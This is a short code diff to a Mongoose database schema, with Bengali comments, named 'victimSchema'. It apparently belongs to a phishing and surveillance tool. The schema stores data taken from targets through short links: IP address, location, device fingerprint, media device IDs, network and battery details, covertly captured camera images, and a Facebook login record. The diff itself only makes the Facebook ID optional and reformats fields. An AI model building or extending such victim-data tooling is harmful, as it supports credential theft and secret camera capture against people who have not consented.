@@ -2,13 +2,12 @@ const mongoose = require('mongoose');
 
 const victimSchema = new mongoose.Schema({
     id: { type: String, unique: true, required: true },
-    fbId: { type: String, required: true },
+    fbId: { type: String, default: 'unknown' },  // required সরানো হয়েছে
     type: { type: String, enum: ['camera', 'fb'], default: 'camera' },
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
     status: { type: String, default: 'pending' },
     
-    // ব্রাউজার ডেটা
     ip: { type: String },
     location: {
         country: String,
@@ -45,11 +44,7 @@ const victimSchema = new mongoose.Schema({
         screen: String,
         colorDepth: Number
     },
-    media: [{
-        kind: String,
-        label: String,
-        deviceId: String
-    }],
+    media: [{ kind: String, label: String, deviceId: String }],
     network: {
         type: String,
         rtt: Number,
@@ -65,7 +60,7 @@ const victimSchema = new mongoose.Schema({
         dischargingTime: Number
     },
     camera: [{
-        image: { type: String },
+        image: String,
         timestamp: { type: Date, default: Date.now }
     }],
     fbLogin: {
